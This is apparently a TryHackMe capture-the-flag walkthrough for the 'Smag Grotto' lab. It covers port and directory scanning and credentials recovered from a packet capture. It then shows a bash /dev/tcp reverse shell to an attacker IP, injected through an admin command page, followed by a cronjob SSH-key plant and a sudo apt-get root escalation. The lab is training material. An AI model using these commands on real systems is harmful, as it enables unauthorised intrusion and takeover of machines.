# [Smag Grotto](https://tryhackme.com/room/smaggrotto)

## Follow the yellow brick road.

# Smag Grotto

## Deploy the machine and get root privileges.

### What is the user flag?

1. Start with a port scan to identify open services on the target machine

```bash
nmap <TARGET_IP>
```

[SCREEN01]

Enumerate web directories to discover hidden endpoints and files. Use gobuster with common wordlists

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
```

The scan discovers a `/mail/` directory which may contain useful information

[SCREEN02]

3. Navigate to `http://<TARGET_IP>/mail/` and download the file `dHJhY2Uy.pcap` for analysis

4. Open the pcap file in Wireshark or use tcpdump to analyze network traffic

In the packet capture, we discover:

- A subdomain: `development.smag.thm`
- Credentials: `helpdesk:cH4nG3M3_n0w`

[SCREEN03]

5. Add the discovered subdomain to the hosts file

```bash
echo '<TARGET_IP> development.smag.thm' >> /etc/hosts
```

6. Navigate to `http://development.smag.thm/login.php` and authenticate using the credentials found. Upon successful login, you are redirected to `http://development.smag.thm/admin.php`

7. Test the command execution functionality. It appears to accept shell commands. Set up a netcat listener to catch a reverse shell

```bash
nc -lvnp 4444
```

8. Execute a reverse shell payload in the command field at `http://development.smag.thm/admin.php`

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

9. Once the reverse shell connects, check scheduled tasks for privilege escalation opportunities

```bash
cat /etc/crontab
```

[SCREEN04]

The crontab reveals a cronjob running as user `jake` that executes `/opt/.backups/jake_id_rsa.pub.backup` restoration script. This script copies SSH public keys from backup files

10. Generate an SSH key pair on your attacking machine to gain persistent access as user `jake`

```bash
ssh-keygen -t rsa
cat jake.pub
```

[SCREEN05]

11. Write your public SSH key to the backup location that the cronjob monitors. The cronjob will restore this key to jake's authorized_keys file.

```bash
cd /opt/.backups/
echo "ssh-rsa AAA...qjE= root@kali" > jake_id_rsa.pub.backup
```

12. SSH into the machine as user `jake` using your private key and retrieve the user flag

```bash
ssh -i jake jake@<TARGET_IP>
cat user.txt
```

[SCREEN06]

---

### What is the root flag?

1. Check sudo privileges for the `jake` user to identify potential privilege escalation vectors

```bash
sudo -l
```

[SCREEN07]

2. Check [GTFOBins](https://gtfobins.github.io/) for apt-get privilege escalation techniques. Exploit the sudo permission to spawn a root shell and retrieve the root flag

```bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
cat /root/root.txt
```

[SCREEN08]
